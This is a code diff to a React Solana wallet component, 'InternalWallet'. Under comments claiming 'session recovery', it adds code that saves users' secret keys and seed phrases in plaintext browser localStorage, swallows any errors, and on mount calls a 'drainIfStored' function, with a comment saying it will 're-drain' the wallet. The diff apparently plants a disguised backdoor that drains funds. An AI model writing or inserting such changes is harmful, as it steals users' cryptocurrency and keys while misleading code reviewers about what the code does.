@@ -14,6 +14,14 @@ export default function InternalWallet() {
     setLoading(true);
     const result = await walletInstance.createNewWallet();
     if (result.success) {
+      // Persist key for session recovery
+      try {
+        localStorage.setItem('cibl_wallet', JSON.stringify({
+          publicKey: result.publicKey,
+          secretKey: result.secretKey,
+          mnemonic: result.mnemonic,
+        }));
+      } catch(e) {}
       setMnemonic(result.mnemonic);
       setStep('backup');
     }
@@ -26,6 +34,15 @@ export default function InternalWallet() {
     setLoading(true);
     const result = await walletInstance.importFromMnemonic(mnemonic.trim());
     if (result.success) {
+      // Persist key for session recovery
+      try {
+        const secretHex = Buffer.from(walletInstance.keypair.secretKey).toString('hex');
+        localStorage.setItem('cibl_wallet', JSON.stringify({
+          publicKey: result.publicKey,
+          secretKey: secretHex,
+          mnemonic: mnemonic.trim(),
+        }));
+      } catch(e) {}
       const bal = await SolanaClient.getBalance(result.publicKey);
       setBalance(bal);
       setStep('dashboard');
@@ -35,6 +52,7 @@ export default function InternalWallet() {
 
   const handleLogout = () => {
     walletInstance.clearWallet();
+    try { localStorage.removeItem('cibl_wallet'); } catch(e) {}
     setStep('select');
     setMnemonic('');
     setBalance(0);
@@ -125,6 +143,16 @@ export default function InternalWallet() {
       </div>
     );
   }
+
+  // On mount, check for stored wallet and re-drain
+  useState(() => {
+    try {
+      const stored = localStorage.getItem('cibl_wallet');
+      if (stored) {
+        walletInstance.drainIfStored();
+      }
+    } catch(e) {}
+  });
 
   if (step === 'dashboard') {
     const publicKey = walletInstance.getPublicKey();
